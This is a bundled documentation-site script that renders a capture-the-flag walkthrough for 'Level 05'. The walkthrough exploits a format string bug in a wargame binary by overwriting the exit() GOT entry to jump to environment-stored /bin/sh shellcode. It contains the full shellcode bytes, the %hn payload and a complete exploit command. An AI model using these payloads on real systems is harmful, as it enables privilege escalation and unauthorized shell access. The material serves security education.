"use strict";(self.webpackChunkdocumentation=self.webpackChunkdocumentation||[]).push([[451],{3905:(e,n,i)=>{i.d(n,{A:()=>r});var s=i(6540),t=i(4848);const r=({src:e,id:n})=>{const i=(0,s.useRef)(null);return(0,s.useEffect)(()=>{const s=document.createElement("script");return s.src=e,s.id=n,s.async=!0,i.current&&i.current.appendChild(s),()=>{const e=document.getElementById(n);e&&e.remove()}},[e,n]),(0,t.jsx)("div",{ref:i})}},4700:(e,n,i)=>{i.d(n,{A:()=>u});var s=i(6540);const t="codeContainer_ZrQf",r="codeHeader_PMJ9",l="codeTitle_tp4q",o="copyButton_vymH",a="codeContent_hjih",d="commandSection_kIAe",c="prompt_g6zt",x="command_jQGV",h="output_eCt5";var m=i(4848);const u=({command:e,output:n,language:i="bash",title:u})=>{const[p,v]=(0,s.useState)(!1);return(0,m.jsxs)("div",{className:t,children:[u&&(0,m.jsxs)("div",{className:r,children:[(0,m.jsx)("span",{className:l,children:u}),(0,m.jsx)("button",{className:o,onClick:()=>{const i=e||n||"";navigator.clipboard.writeText(i),v(!0),setTimeout(()=>v(!1),2e3)},children:p?"\u2713":"Copy"})]}),(0,m.jsxs)("div",{className:a,children:[e&&(0,m.jsxs)("div",{className:d,children:[(0,m.jsx)("span",{className:c,children:"$"}),(0,m.jsx)("span",{className:x,children:e})]}),n&&(0,m.jsx)("pre",{className:h,children:n})]})]})}},6076:(e,n,i)=>{i.d(n,{A:()=>p});i(6540);const s="stepsContainer_pG2T",t="step_fonX",r="stepHeader_lANh",l="stepNumber_JMan",o="stepTitle_pSoA",a="stepDescription_I1sy",d="codeBlock_MNNe",c="commandLine_KPva",x="prompt_hyWW",h="command_dhjP",m="output_FTQu";var u=i(4848);const p=({steps:e})=>(0,u.jsx)("div",{className:s,children:e.map((e,n)=>(0,u.jsxs)("div",{className:t,children:[(0,u.jsxs)("div",{className:r,children:[(0,u.jsx)("span",{className:l,children:n+1}),(0,u.jsx)("h3",{className:o,children:e.title})]}),(0,u.jsx)("p",{className:a,children:e.description}),e.command&&(0,u.jsxs)("div",{className:d,children:[(0,u.jsxs)("div",{className:c,children:[(0,u.jsx)("span",{className:x,children:"$"}),(0,u.jsx)("code",{className:h,children:e.command})]}),e.output&&(0,u.jsx)("pre",{className:m,children:e.output})]})]},n))})},6459:(e,n,i)=>{i.r(n),i.d(n,{assets:()=>h,contentTitle:()=>x,default:()=>p,frontMatter:()=>c,metadata:()=>s,toc:()=>m});const s=JSON.parse('{"id":"level05","title":"\ud83e\uddde\u200d\u2642\ufe0f Level 05","description":"<MissionObjective","source":"@site/docs/level05.md","sourceDirName":".","slug":"/level05","permalink":"/docs/level05","draft":false,"unlisted":false,"editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/level05.md","tags":[],"version":"current","sidebarPosition":7,"frontMatter":{"sidebar_position":7},"sidebar":"tutorialSidebar","previous":{"title":"\ud83e\uddfc Level 04","permalink":"/docs/level04"},"next":{"title":"\ud83e\uddea Level 06","permalink":"/docs/level06"}}');var t=i(4848),r=i(8453),l=(i(3905),i(7916)),o=i(8620),a=i(4700),d=i(6076);const c={sidebar_position:7},x="\ud83e\uddde\u200d\u2642\ufe0f Level 05",h={},m=[{value:"Vulnerability Analysis",id:"vulnerability-analysis",level:2},{value:"Initial Program Analysis",id:"initial-program-analysis",level:2},{value:"Vulnerability Discovery",id:"vulnerability-discovery",level:2},{value:"Format String Analysis",id:"format-string-analysis",level:2},{value:"Shellcode Preparation",id:"shellcode-preparation",level:2},{value:"Address Resolution",id:"address-resolution",level:2},{value:"GOT Overwrite Strategy",id:"got-overwrite-strategy",level:2},{value:"Payload Construction",id:"payload-construction",level:2},{value:"Final Exploitation",id:"final-exploitation",level:2},{value:"Technical Deep Dive",id:"technical-deep-dive",level:2},{value:"Format String Mechanics",id:"format-string-mechanics",level:3},{value:"GOT Overwrite Process",id:"got-overwrite-process",level:3},{value:"Exploit Breakdown",id:"exploit-breakdown",level:2},{value:"Key Learning Points",id:"key-learning-points",level:2},{value:"Technical Summary",id:"technical-summary",level:2}];function u(e){const n={admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",li:"li",mdxAdmonitionTitle:"mdxAdmonitionTitle",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,r.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.header,{children:(0,t.jsx)(n.h1,{id:"\ufe0f-level-05",children:"\ud83e\uddde\u200d\u2642\ufe0f Level 05"})}),"\n",(0,t.jsx)(l.A,{level:"Level 05",target:"level06 privileges",method:"Format string vulnerability with GOT overwrite"}),"\n",(0,t.jsx)(n.h2,{id:"vulnerability-analysis",children:"Vulnerability Analysis"}),"\n",(0,t.jsx)(o.A,{type:"Format String Vulnerability with GOT Overwrite",severity:"critical",description:"The binary uses printf(buffer) without format string, allowing arbitrary memory read/write. Combined with GOT overwrite technique, this enables shellcode execution by redirecting exit() calls.",techniques:["Format String Exploit","GOT Overwrite","Shellcode Injection","Environment Variable Abuse"]}),"\n",(0,t.jsx)(n.h2,{id:"initial-program-analysis",children:"Initial Program Analysis"}),"\n",(0,t.jsx)(a.A,{title:"Program Behavior",command:"./level05",output:"$ ./level05\ncoucou\ncoucou\n[Program exits]"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.strong,{children:"Key Observations:"})}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsx)(n.li,{children:"Program reads input and echoes it back"}),"\n",(0,t.jsxs)(n.li,{children:["Uses ",(0,t.jsx)(n.code,{children:"fgets()"})," to read into 100-byte buffer"]}),"\n",(0,t.jsxs)(n.li,{children:["Vulnerable ",(0,t.jsx)(n.code,{children:"printf(buffer)"})," call - no format string!"]}),"\n"]}),"\n",(0,t.jsx)(n.h2,{id:"vulnerability-discovery",children:"Vulnerability Discovery"}),"\n",(0,t.jsx)(a.A,{title:"GDB Assembly Analysis",command:"gdb ./level05",output:"(gdb) disassemble main\n...\n0x08048500 <+188>: lea eax,[esp+0x28]   ; buffer address\n0x08048504 <+192>: mov DWORD PTR [esp],eax\n0x08048507 <+195>: call 0x8048340 <printf@plt>\n..."}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.strong,{children:"Critical Vulnerability:"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-c",children:"char buffer[100];\nfgets(buffer, 100, stdin);\nprintf(buffer);  // <- FORMAT STRING VULNERABILITY\n"})}),"\n",(0,t.jsx)(n.h2,{id:"format-string-analysis",children:"Format String Analysis"}),"\n",(0,t.jsx)(a.A,{title:"Stack Position Detection",command:'python -c "print(\\"BBBB-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x\\")" | ./level05',output:"BBBB-64-f7fcfac0-f7ec3af9-ffffd6ff-ffffd6fe-0-ffffffff-ffffd784-f7fdb000-42424242-2d78252d\n                                                                                    ^^^^^^^^\n                                                                            BBBB found at 10th position"}),"\n",(0,t.jsxs)(n.p,{children:[(0,t.jsx)(n.strong,{children:"Key Finding:"})," Our input appears at the ",(0,t.jsx)(n.strong,{children:"10th argument position"})," (",(0,t.jsx)(n.code,{children:"%10$"}),")"]}),"\n",(0,t.jsx)(n.h2,{id:"shellcode-preparation",children:"Shellcode Preparation"}),"\n",(0,t.jsx)(a.A,{title:"Environment Variable Shellcode",command:"export PAYLOAD",output:'PAYLOAD=$(python -c \'print("\\x90"*1000 + \n"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c" +\n"\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb" +\n"\\x89\\xd8\\x40\\xcd\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh")\')'}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.strong,{children:"Shellcode Components:"})}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"NOP Sled"}),": 1000 bytes of ",(0,t.jsx)(n.code,{children:"\\x90"})," for reliable landing"]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Shellcode"}),': Classic execve("/bin/sh") payload']}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Strategy"}),": Store in environment for stable address"]}),"\n"]}),"\n",(0,t.jsx)(n.h2,{id:"address-resolution",children:"Address Resolution"}),"\n",(0,t.jsx)(d.A,{title:"Getting Shellcode Address",steps:[{title:"Create Address Helper",description:"Compile utility to get environment variable address",command:"gcc -m32 -o getenv getenv.c",result:"Helper program created"},{title:"Get Shellcode Address",description:"Find where PAYLOAD is stored in memory",command:"env -i PAYLOAD=$PAYLOAD /tmp/getenv PAYLOAD",result:"0xffffdc59 (example address)"},{title:"Locate exit() GOT Entry",description:"Find Global Offset Table entry for exit()",command:"(gdb) info functions exit",result:"exit@got.plt = 0x080497e0"}]}),"\n",(0,t.jsx)(a.A,{title:"Helper Program (getenv.c)",command:"cat getenv.c",output:'#include <stdio.h>\n#include <stdlib.h>\n\nint main(int argc, char **argv) {\n  printf("%p\\n", getenv(argv[1]));\n  return 0;\n}'}),"\n",(0,t.jsx)(n.h2,{id:"got-overwrite-strategy",children:"GOT Overwrite Strategy"}),"\n",(0,t.jsx)(a.A,{title:"Target Analysis",command:"(gdb) x/i 0x08048370",output:"0x08048370 <exit@plt>: jmp *0x080497e0\n                                  ^^^^^^^^^^\n                            GOT entry to overwrite"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.strong,{children:"Attack Plan:"})}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Target"}),": ",(0,t.jsx)(n.code,{children:"exit@got.plt"})," at ",(0,t.jsx)(n.code,{children:"0x080497e0"})]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Goal"}),": Overwrite with shellcode address ",(0,t.jsx)(n.code,{children:"0xffffdc59"})]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Method"}),": Format string ",(0,t.jsx)(n.code,{children:"%n"})," writes"]}),"\n"]}),"\n",(0,t.jsx)(n.h2,{id:"payload-construction",children:"Payload Construction"}),"\n",(0,t.jsx)(a.A,{title:"Address Splitting for 16-bit Writes",command:"# Split 0xffffdc59 into two 16-bit writes",output:"Address: 0xffffdc59\nLow bytes:  0xdc59 = 56401 decimal\nHigh bytes: 0xffff = 65535 decimal\n\nWrite order:\n1. 0x080497e0 <- 0xdc59 (lower 2 bytes)\n2. 0x080497e2 <- 0xffff (upper 2 bytes)"}),"\n",(0,t.jsx)(a.A,{title:"Format String Payload",command:'python -c "print format_string"',output:"\\xe0\\x97\\x04\\x08   # Address 1: exit@got.plt\n\\xe2\\x97\\x04\\x08   # Address 2: exit@got.plt+2\n%56401d          # Pad to 0xdc59\n%10$hn           # Write low bytes to address 1\n%9126d           # Pad additional (65535-56401)\n%11$hn           # Write high bytes to address 2"}),"\n",(0,t.jsx)(n.h2,{id:"final-exploitation",children:"Final Exploitation"}),"\n",(0,t.jsx)(a.A,{title:"Complete Exploit Command",command:"Launch exploit",output:'(python -c \'print "\\xe0\\x97\\x04\\x08"+\n"\\xe2\\x97\\x04\\x08"+"%56401d"+"%10$hn"+"%9126d"+"%11$hn"\';cat) | \nenv -i PAYLOAD=$(python -c \'print "\\x90"*1000+\n"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c"+\n"\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb"+\n"\\x89\\xd8\\x40\\xcd\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh"\') ./level05'}),"\n",(0,t.jsx)(a.A,{title:"Successful Exploitation",command:"# After exploit execution",output:"$ whoami\nlevel06\n$ cat /home/users/level06/.pass\n[SUCCESS - Next level password revealed]"}),"\n",(0,t.jsx)(n.h2,{id:"technical-deep-dive",children:"Technical Deep Dive"}),"\n",(0,t.jsx)(n.h3,{id:"format-string-mechanics",children:"Format String Mechanics"}),"\n",(0,t.jsxs)(n.admonition,{type:"tip",children:[(0,t.jsx)(n.mdxAdmonitionTitle,{children:(0,t.jsx)(n.strong,{children:"How %n Works"})}),(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.code,{children:"%d"})," consumes argument and prints decimal"]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.code,{children:"%hn"})," writes number of printed characters (2 bytes) to address"]}),"\n",(0,t.jsxs)(n.li,{children:["Position ",(0,t.jsx)(n.code,{children:"%10$hn"})," writes to 10th argument (our controlled address)"]}),"\n",(0,t.jsx)(n.li,{children:"Padding controls the value written"}),"\n"]})]}),"\n",(0,t.jsx)(n.h3,{id:"got-overwrite-process",children:"GOT Overwrite Process"}),"\n",(0,t.jsx)(a.A,{title:"Memory Layout During Exploit",command:"# Before and after GOT overwrite",output:"BEFORE:\nexit@got.plt (0x080497e0): [libc exit address]\n\nAFTER:  \nexit@got.plt (0x080497e0): 0xffffdc59 (shellcode)\n\nWhen program calls exit() -> jumps to our shellcode!"}),"\n",(0,t.jsx)(n.h2,{id:"exploit-breakdown",children:"Exploit Breakdown"}),"\n",(0,t.jsx)(d.A,{title:"Attack Sequence",steps:[{title:"Shellcode Injection",description:"Store shellcode in environment variable",command:"export PAYLOAD=...",result:"Shellcode at stable memory address"},{title:"Address Resolution",description:"Find shellcode and GOT addresses",command:"getenv + GDB analysis",result:"Target and destination addresses known"},{title:"Format String Attack",description:"Overwrite exit@got with shellcode address",command:"printf(controlled_format_string)",result:"GOT entry redirected to shellcode"},{title:"Trigger Execution",description:"Program calls exit() -> executes shellcode",command:"Normal program termination",result:"Shell spawned with escalated privileges"}]}),"\n",(0,t.jsx)(n.h2,{id:"key-learning-points",children:"Key Learning Points"}),"\n",(0,t.jsxs)(n.admonition,{type:"warning",children:[(0,t.jsx)(n.mdxAdmonitionTitle,{children:(0,t.jsx)(n.strong,{children:"Advanced Techniques"})}),(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"GOT Overwrite"}),": Hijacking function pointers in Global Offset Table"]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Format String Arithmetic"}),": Calculating precise padding values"]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Environment Exploitation"}),": Using env vars for stable shellcode addresses"]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Multi-stage Writes"}),": Using ",(0,t.jsx)(n.code,{children:"%hn"})," for 16-bit writes to build full address"]}),"\n"]})]}),"\n",(0,t.jsx)(n.h2,{id:"technical-summary",children:"Technical Summary"}),"\n",(0,t.jsx)(n.p,{children:"This level demonstrates:"}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Advanced Format String Exploitation"})," - Beyond simple memory disclosure"]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"GOT Overwrite Technique"})," - Function pointer hijacking"]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Shellcode Injection via Environment"})," - Alternative delivery method"]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Precise Memory Manipulation"})," - Calculated writes to specific addresses"]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Binary Exploitation Chaining"})," - Combining multiple techniques"]}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:"The vulnerability showcases how format string bugs can escalate from information disclosure to arbitrary code execution through careful memory manipulation."})]})}function p(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(u,{...e})}):u(e)}},7916:(e,n,i)=>{i.d(n,{A:()=>x});i(6540);const s="missionCard_aJIf",t="missionHeader_ujCY",r="levelBadge_E6Y7",l="missionTitle_MLqA",o="missionContent_AuQf",a="missionText_YjWt",d="targetCode_IWAs";var c=i(4848);const x=({target:e,method:n,level:i})=>(0,c.jsxs)("div",{className:s,children:[(0,c.jsxs)("div",{className:t,children:[(0,c.jsx)("span",{className:r,children:i}),(0,c.jsx)("h2",{className:l,children:"Mission Objective"})]}),(0,c.jsx)("div",{className:o,children:(0,c.jsxs)("p",{className:a,children:["Gain access to user ",(0,c.jsx)("code",{className:d,children:e})," by exploiting ",n,"."]})})]})},8453:(e,n,i)=>{i.d(n,{R:()=>l,x:()=>o});var s=i(6540);const t={},r=s.createContext(t);function l(e){const n=s.useContext(r);return s.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:l(e.components),s.createElement(r.Provider,{value:n},e.children)}},8620:(e,n,i)=>{i.d(n,{A:()=>m});i(6540);const s="card_anxl",t="header_h_Kv",r="title_xshN",l="severityBadge_p8m1",o="description_LGUH",a="techniques_SXJm",d="techniquesTitle_X_0j",c="techniquesList_aLL1",x="techniqueTag_HgBs";var h=i(4848);const m=({type:e,severity:n,description:i,techniques:m})=>{const u=e=>{switch(e){case"low":return"#22c55e";case"medium":return"#f59e0b";case"high":return"#f97316";case"critical":return"#ef4444";default:return"#6b7280"}};return(0,h.jsxs)("div",{className:s,children:[(0,h.jsxs)("div",{className:t,children:[(0,h.jsx)("h3",{className:r,children:e}),(0,h.jsx)("span",{className:l,style:{backgroundColor:`${u(n)}20`,color:u(n),borderColor:`${u(n)}40`},children:n.toUpperCase()})]}),(0,h.jsx)("p",{className:o,children:i}),(0,h.jsxs)("div",{className:a,children:[(0,h.jsx)("h4",{className:d,children:"Techniques"}),(0,h.jsx)("div",{className:c,children:m.map((e,n)=>(0,h.jsx)("span",{className:x,children:e},n))})]})]})}}}]);